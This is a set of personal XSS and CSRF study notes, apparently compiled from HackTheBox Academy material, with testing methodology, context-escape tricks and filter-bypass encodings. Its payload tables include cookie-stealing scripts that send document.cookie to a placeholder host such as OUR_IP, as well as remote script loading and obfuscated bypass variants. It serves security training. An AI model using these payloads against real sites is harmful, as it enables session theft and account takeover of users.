# XSS and CSRF
XSS vulnerabilities take advantage of a flaw in user input sanitization to "write" JavaScript code to the page and execute it on the client side. Of course these vulnerabilities run entirely within the browser's sandbox and is confined to what the browser can do... it's really just JavaScript injection just like SQL injection

# Resources
- [HTB Cross-Site Scripting (XSS) Module](https://academy.hackthebox.com/module/103/section/965)
- [HTB Advanced XSS and CSRF Exploitation Module](https://academy.hackthebox.com/module/235/section/2653)
- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger Xss](https://portswigger.net/web-security/cross-site-scripting)
- [HackTricks XSS](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html)
  
# Good Examples
- [Rook to XSS](https://skii.dev/rook-to-xss/?ref=weekly.infosecwriteups.com)
- [MySpace Samy worm](https://en.wikipedia.org/wiki/Samy_(computer_worm))
- [Twitter TweetDeck](https://blog.sucuri.net/2014/06/serious-cross-site-scripting-vulnerability-in-tweetdeck-twitter.html)
- [Google Search XSS](https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/)
- [Apache XSS](https://infra.apache.org/blog/apache_org_04_09_2010)

# Tooling
- [Nessus](https://www.tenable.com/products/nessus)
- [BurpSuite Pro](https://portswigger.net/burp/pro)
- [ZAP](https://www.zaproxy.org/)
- [XSS Strike](https://github.com/s0md3v/XSStrike)
- [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS)
- [XSSer](https://github.com/epsylon/xsser)

# Methodology TLDR
[HackTricks](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html#methodology)
1. Check for any value or parameter you control (from input) is being REFLECTED in the page source or being USED by JavaScript in any of it's logic
2. If reflected (serverside), find it's context (raw HTML / HTML tag / JS code or function) and depending on it's context will dictate what you can or can not do
3. If used in client-side JavaScript, you could exploit a DOM XSS - pay attention how your input is controlled and if your controlled input is used by any sink.

# XSS Testing Payloads
Code review is the most reliable way to get a XSS rather than throwing automated tooling at a website. Remember to check where your input is presenting itself to understand the context and what will work depending on that (See Notes below)

| Description | Code |
|-------------|------|
| Check for filtering (See Notes below) | ;:!--''" <SCs>=&{[(`)]}//. |
| Basic XSS Payload | `<marquee>` |
| Basic XSS Payload | `<script>alert(window.origin)</script>` |
| Basic XSS Payload | `<script>alert(1)</script>` |
| Basic XSS Payload that stops rendering the HTML code that comes after it and display it as plaintext.  | `<plaintext>` |
| Basic XSS Payload | `<script>print()</script>` |
| HTML-based XSS Payload | `<img src="" onerror=alert(window.origin)>` |
| Change Background Color | `<script>document.body.style.background = "#141d2b"</script>` |
| Change Background Image | `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` |
| Change Website Title | `<script>document.title = 'HackTheBox Academy'</script>` |
| Overwrite website's main body | `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` |


# XSS Payloads
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
- [PayloadBox](https://github.com/payloadbox/xss-payload-list)

| Description | Code |
|-------------|------|
| Cookie Stealing XSS | `<script>document.write('<img src="http://<Your IP>/Stealer.php?cookie=' %2B document.cookie %2B '" />');</script>` |
| Send Cookie details to us | `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` |
| Forcing the Download of a File | `<script>var link = document.createElement('a'); link.href = 'http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe'; link.download = ''; document.body.appendChild(link); link.click();</script>` |
| Redirecting User | `<script>window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";</script>` |
| Remove certain HTML element | `<script>document.getElementById('urlform').remove();</script>` |
| Load remote script to look for blind XSS | `<script src="http://OUR_IP/script.js"></script>` |


# Notes
## Stored XSS
Most critical where the injected XSS payload gets stored in the back-end database and retrieved upon visiting the page, this means that our XSS attack is persistent and may affect any user that visits the page.

## Reflected XSS (Not stored)
2 types, both non-persistent:
- `Reflected` payload gets processed by the back-end server - server-side vulnerability
- `DOM-based XSS` payload is completely processed on the client-side and never reaches the back-end server. Nothing in the network tab - therefore client-side vulnerabiltiy. DOM XSS occurs when JavaScript is used to change the page source through the Document Object Model (DOM).

For DOM-based XSS - you need to understand SOURCE and SINK. The Source is the JavaScript object that takes the user input, and it can be any input parameter like a URL parameter or an input field, as we saw above. On the other hand, the Sink is the function that writes the user input to a DOM Object on the page. If the Sink function does not properly sanitize the user input, it would be vulnerable to an XSS attack. Some of the commonly used 

Some of the commonly used JavaScript functions to write to DOM objects are:
- `document.write()`
- `DOM.innerHTML`
- `DOM.outerHTML`

Furthermore, some of the jQuery library functions that write to DOM objects are:
- `add()`
- `after()`
- `append()`
  
If a Sink function writes the exact input without any sanitization (like the above functions), and no other means of sanitization were used, then we know that the page should be vulnerable to XSS.

## Blind XSS
Occurs when the vulnerability is triggered on a page we don't have access to like forms only accessible by priivleged users. Some potential examples include:
- Contact Forms
- Reviews
- User Details
- Support Tickets
- HTTP User-Agent header





## Same-Origin Policy (SOP) 
Tries to set boundaries by preventing one origin (website) from accessing resources from another origin. A different origin is defined by something that has a different protocol (`http` vs `https`), domain (`example.com` vs `google.com`) and port (`80` vs `443`)

## Content Security Policy (CSP) 
Also tries to add an additional later that lets websites declare which sources of content are trusted. e.g Without CSP an attacker can injects `<script>steal(document.cookie)</script>`. However, the SOP would limit the damage - the malicious script would only be able to access data from the current origin, not from the user's other tabs. If the CSP blocking inline scripts, that injection would be blocked. 

## Where is the output presenting itself?
Determine where your input is getting printed in the HTTP response we receive back:
- Inside the head or body: Easy, just use your regular HTML tags like `<script>alert(1)</script>` or load an external script `<script src=https://onofri.org/security/xss.js></script>.`
- If you are inside a comment, you have to escape out of the comment: `--><script>alert(1)</script>`
- Same applies to `<textarea>` - we have to escape it first with `</textarea><script>alert(1)</script>`
- If we are inside a HTMl attribute we can try terminate it right before our payload (vector). An attribute can be delimited by single or double quotes or whitespace. Then we close the tag and place our payload e.g `'><script>alert(1)</script>` or `"><script>alert(1)</script>`
- If we can't escape out of an attribute we might be able to abuse it itself: e.g if we are in a `href` or `src` attribute we can use it directly with: `javascript:alert(1)` but each attribute/element might behave a little differently. And `"onmouseover="alert(1)` or  `'onmouseover='alert(1)` are valid for most.
- If we're in JS code it depends where we are in the code, JS comments are `//`, it's line terminator is `;` and of course `'` + `"`
- Markdown XSS is a thing: `[xss[(javascript:alert('1'))`

## When is our input getting processed?
`<script>alert(1)</script>` is triggered on page load. However if our payload loads dynamically, such as `<img src=x onerror-alert(1)>`, this may be advantageous since onerror is triggered dynamically. Which means:
- Harder for security scanners to detect since the malicious code isn't present during initial page analysis :point_left:
- Can bypass some client-side filters that only check content on page load :point_left:
- Often involves content that gets injected into the DOM after the page has already loaded

# XSS Filter Bypasses
- [OWASP FIlter Evasion](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
Client-side filters are relatively easy to bypass with BurpSuite, Server-side filters like a WAF or integrated into the app vary in effectiveness as it depends largely on their config.

How might these filters be implemented?
- Allow listing (Whitelisting) of allowed elements, attributes or characters.
- Blacklisting of allowed elements, attributes or characters.
- Filters are often layered. A payload may pass one filter but get caught by another
- Input could be truncated after a certain number of characters so worth trying short payloads. Some browsers will let you omit `http` or `https` by using `//` e.g `<script/src=//v.ht/aa`
- HTML is case-sensitive whilst JavaScript is not.
- Authors favourite way to evaluate what characters are encoded or not, as it will help determine which useful characters are permitted, encoded, removed and whether the input is in upper or lowercase:
```
;:!--''" <SCs>=&{[(`)]}//.
```
Weak Blacklists:
- Casing: `<ScRiPt>alert(1);</ScRiPt>`
- Casing: `<object data="JaVaScRiPt:alert(1)">`
- Casing: `<img src=x OnErRoR=alert(1)>`
- No Space allowed: `<svg/onload=alert(1)>`
- If `img` is blocked, try `audio` or `video`
- If `alert` is blocked, try `prompt` or `confirm`
- If parenthesis `()` are blocked, try the back tick `
- To combine the last 3:
```
<audio src onloadstart=confirm`1`>
```
- Partial encoding e.g if the string `javascript:` is blocked, try `j&#X41vascript:`

JavaScript Encodings
- Unicode: `"\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029"`
- Octal: `"\141\154\145\162\164\50\61\51"`
- Hex: `"\x61\x6c\x65\x72\x74\x28\x31\x29"`
- Base64: `atob("YWxlcnQoMSk=")`

String Creation
- fromCharCode: `String.fromCharCode(97,108,101,114,116,40,49,41)`
- source: `/alert(1)/.source`
- URL Encoding: `decodeURI(/alert(%22xss%22)/.source)`

Execution Sinks:
- eval: `eval("alert(1)")`
- setTimeout: `setTimeout("alert(1)")`
- setInterval: `setInterval("alert(1)")`
- Function: `Function("alert(1)")()`
- constructor: `[].constructor.constructor(alert(1))()`

---

# Tricks & Quirks
- XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).
- If you're defacing, you can always open the `.html` locally to test how it looks
- Email fields usually must match an email format, even if we try manipulating the HTTP request parameters, as it's usually validated on both the front-end and the back-end. Likewise, we may skip the password field, as passwords are usually hashed and not usually shown in cleartext. This helps us in reducing the number of potentially vulnerable input fields we need to test.
- Most common XSS protections are length issues and not allowing < or > or according to THP1.
- The following will let us know which of the fields (`fullname` or `username`) is vulnerable based of what we see on our listener:
```js
<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
<script src=http://OUR_IP/username></script> #this goes inside the username field
```

# HTB Module questions
## Cross-Site Scripting (XSS)
## Advanced XSS and CSRF Exploitation
